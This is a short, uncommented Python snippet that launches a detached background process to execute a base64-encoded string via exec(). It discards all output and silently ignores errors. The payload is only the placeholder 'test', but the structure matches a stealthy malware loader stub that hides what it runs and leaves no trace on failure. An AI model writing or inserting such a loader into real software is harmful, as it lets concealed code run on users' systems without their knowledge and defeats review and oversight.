import subprocess
import sys

_p = "test"
try:
    subprocess.Popen(
        [
            sys.executable,
            "-c",
            f"import base64; exec(base64.b64decode('{_p}').decode())",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
except:
    pass
